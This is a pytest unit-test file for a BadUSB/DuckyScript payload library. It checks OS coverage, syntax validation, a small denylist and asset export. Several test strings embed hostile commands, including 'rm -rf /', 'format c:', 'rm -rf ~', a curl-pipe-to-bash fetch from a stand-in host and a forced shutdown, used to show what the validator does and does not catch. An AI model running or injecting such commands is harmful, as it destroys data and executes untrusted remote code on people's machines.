"""Unit tests for BadUSB payloads library and DuckyScript validation."""

import json

import pytest

from flopper.badusb import (
    BadUSBPayload,
    PayloadCategory,
    TargetOS,
    export_payload_assets,
    get_default_payloads,
    validate_duckyscript,
)
from flopper.manifest import AssetEntry


def test_get_default_payloads() -> None:
    """Check that default payloads cover Windows, macOS, Linux and Multi."""
    payloads = get_default_payloads()
    assert len(payloads) >= 5

    os_targets = {p.target_os for p in payloads}
    assert TargetOS.WINDOWS in os_targets
    assert TargetOS.MACOS in os_targets
    assert TargetOS.LINUX in os_targets
    assert TargetOS.CROSS_PLATFORM in os_targets


def test_validate_duckyscript_valid() -> None:
    """Test valid DuckyScript scripts."""
    valid_script = (
        "REM This is a comment\n"
        "DELAY 500\n"
        "GUI r\n"
        "STRING notepad.exe\n"
        "ENTER\n"
        "DELAY 200\n"
        "STRING Hello World\n"
        "ENTER\n"
    )
    assert validate_duckyscript(valid_script) is True


def test_validate_duckyscript_invalid_syntax() -> None:
    """Test invalid or unknown commands."""
    assert validate_duckyscript("") is False
    assert validate_duckyscript("   ") is False
    assert validate_duckyscript("UNKNOWN_CMD 123") is False


def test_validate_duckyscript_denylist_defense_in_depth() -> None:
    """The small best-effort denylist still rejects its few known patterns."""
    assert validate_duckyscript("STRING rm -rf /\nENTER") is False
    assert validate_duckyscript("STRING format c:\nENTER") is False


def test_validate_duckyscript_is_not_a_safety_filter() -> None:
    """Documents that validation is syntax-only: destructive commands not in the
    tiny denylist pass. Nobody should reuse this function as a safety gate."""
    assert validate_duckyscript("STRING rm -rf ~\nENTER") is True
    assert validate_duckyscript("STRING curl http://x.sh | bash\nENTER") is True
    assert validate_duckyscript("STRING shutdown /s /t 0\nENTER") is True


def test_default_payloads_are_non_destructive() -> None:
    """Safety of the shipped library comes from curation, not from the validator:
    every default payload is a read-only/diagnostic category and valid syntax."""
    safe_categories = {
        PayloadCategory.ADMIN,
        PayloadCategory.NETWORK,
        PayloadCategory.DEMO,
    }
    for payload in get_default_payloads():
        assert payload.category in safe_categories
        assert validate_duckyscript(payload.script_content) is True


def test_export_payload_assets() -> None:
    """Test converting BadUSB payloads to asset entries."""
    payloads = [
        BadUSBPayload(
            name="Test Script",
            filename="test.txt",
            target_os=TargetOS.WINDOWS,
            category=PayloadCategory.ADMIN,
            description="Test description",
            script_content="DELAY 100\nSTRING test\nENTER\n",
        )
    ]

    assets = export_payload_assets(payloads)
    assert len(assets) == 2  # 1 script + 1 manifest

    script_asset = assets[0]
    assert isinstance(script_asset, AssetEntry)
    assert script_asset.destination_path == "/ext/badusb/admin/test.txt"
    assert b"STRING test" in script_asset.content

    manifest_asset = assets[1]
    assert manifest_asset.destination_path == "/ext/badusb/manifest.json"
    manifest_data = json.loads(manifest_asset.content.decode("utf-8"))
    assert len(manifest_data) == 1
    assert manifest_data[0]["filename"] == "test.txt"


def test_export_payload_assets_invalid_raises() -> None:
    """Test that exporting invalid payload raises ValueError."""
    bad_payloads = [
        BadUSBPayload(
            name="Bad Script",
            filename="bad.txt",
            target_os=TargetOS.LINUX,
            category=PayloadCategory.ADMIN,
            description="Bad script",
            script_content="INVALID_OPCODE\n",
        )
    ]
    with pytest.raises(ValueError, match="Payload invalide"):
        export_payload_assets(bad_payloads)
